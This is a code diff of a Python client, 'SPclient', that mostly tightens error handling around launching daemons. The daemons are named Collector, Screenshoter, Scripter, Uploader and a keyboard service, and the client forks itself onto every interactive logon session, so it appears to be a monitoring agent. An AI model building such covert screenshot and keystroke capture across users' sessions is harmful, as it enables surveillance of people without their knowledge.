@@ -24,21 +24,16 @@ def is_already_running(name):
     Check if process "name" is already running on current loggon session
     :name: process name
     """
-    pids = []
-    try:
-        curr_sess = utils.get_session_of_pid(os.getpid())
-        import psutil
-        pids = [proc.pid for proc in psutil.process_iter() if utils.utf(proc.name()) == name and proc.pid != os.getpid()]
-
-    except Exception as e:
-        log.debug(e)
-
-    for pid in pids:
+    import psutil
+    curr_sess = utils.get_session_of_pid(os.getpid())
+    for pid in psutil.pids():
         try:
-            if utils.get_session_of_pid(pid) == curr_sess:
-                return True
+            if pid != os.getpid():
+                proc = psutil.Process(pid)
+                if proc.name() == name and utils.get_session_of_pid(pid) == curr_sess:
+                    return True
         except Exception as e:
-            log.debug(e)
+            log.error(fmt("Error: {e} when processing pid: {p}", e=e, p=pid))
 
 
 def fork_on_session(sess):
@@ -63,19 +58,22 @@ class SPclient():
         self.datadir = os.path.join(config['HOME_DIR'], config['NAME'], utils.get_user_name())
         self.daemons = []
         signal.signal(signal.SIGTERM, self.signal_term)
-        # Если при побитовой операции стартовый флаг и флаг демона равно флагу демона, то запустить демон
-        if config["START_FLAG"] & Collector.FLAG == Collector.FLAG:
-            self.daemons.append(Collector())
-        if config["START_FLAG"] & Screenshoter.FLAG == Screenshoter.FLAG:
-            self.daemons.append(Screenshoter())
-        if config["START_FLAG"] & Scripter.FLAG == Scripter.FLAG:
-            self.daemons.append(Scripter())
-        if config["START_FLAG"] & Uploader.FLAG == Uploader.FLAG:
-            self.daemons.append(Uploader())
-        if config["START_FLAG"] & Kbdsvc.FLAG == Kbdsvc.FLAG:
-            self.daemons.append(Kbdsvc())
+        try:
+            # Если при побитовой операции стартовый флаг и флаг демона равно флагу демона, то запустить демон
+            if config["START_FLAG"] & Collector.FLAG == Collector.FLAG:
+                self.daemons.append(Collector())
+            if config["START_FLAG"] & Screenshoter.FLAG == Screenshoter.FLAG:
+                self.daemons.append(Screenshoter())
+            if config["START_FLAG"] & Scripter.FLAG == Scripter.FLAG:
+                self.daemons.append(Scripter())
+            if config["START_FLAG"] & Uploader.FLAG == Uploader.FLAG:
+                self.daemons.append(Uploader())
+            if config["START_FLAG"] & Kbdsvc.FLAG == Kbdsvc.FLAG:
+                self.daemons.append(Kbdsvc())
 
-        utils.makedirs(self.datadir)
+            utils.makedirs(self.datadir)
+        except Exception as e:
+            log.error(e)
 
     def signal_term(self, signum, frame):
         log.debug(fmt('Get Signal: {0}', signum))
@@ -83,12 +81,18 @@ class SPclient():
 
     def start(self):
         for d in self.daemons:
-            d.start()
+            try:
+                d.start()
+            except Exception as e:
+                log.error(e)
         self.wait_termination()
 
     def stop(self):
         for d in self.daemons:
-            d.stop()
+            try:
+                d.stop()
+            except Exception as e:
+                log.error(e)
 
     def wait_termination(self):
         for d in self.daemons:
@@ -114,23 +118,25 @@ if __name__ == '__main__':
                 self_terminate = False
 
                 if is_already_running(os.path.basename(sys.executable)):
-                    raise Exception(fmt("Already running on session {0}", curr_sess))
-                # fork only on interactive sessions
-                for sessdata in utils._enumerate_logonsessions2():
-                    log.debug(fmt("Session={Session},{UserName},{LogonType}", **sessdata))
-                    if sessdata.get('Session') == curr_sess:
-                        if sessdata.get('LogonType') not in INTERACTIVE:
-                            self_terminate = True
-                    elif sessdata.get('LogonType') in INTERACTIVE:
-                        time.sleep(1)
-                        fork_on_session(sessdata.get('Session'))
-                # If self process was running on non interactive session, then exit
+                    self_terminate = True
+                    log.debug(fmt("Already running on session {0}", curr_sess))
+                else:
+                    # fork only on interactive sessions
+                    for sessdata in utils._enumerate_logonsessions2():
+                        log.debug(fmt("Session={Session},{UserName},{LogonType}", **sessdata))
+                        if sessdata.get('Session') == curr_sess:
+                            if sessdata.get('LogonType') not in INTERACTIVE:
+                                self_terminate = True
+                        elif sessdata.get('LogonType') in INTERACTIVE:
+                            time.sleep(1)
+                            fork_on_session(sessdata.get('Session'))
+
                 if self_terminate:
                     sys.exit()
 
         SPclient().start()
     except Exception as e:
-        log.exception(e)
+        log.error(e)
         sys.exit()
     finally:
         log.debug('Exit')
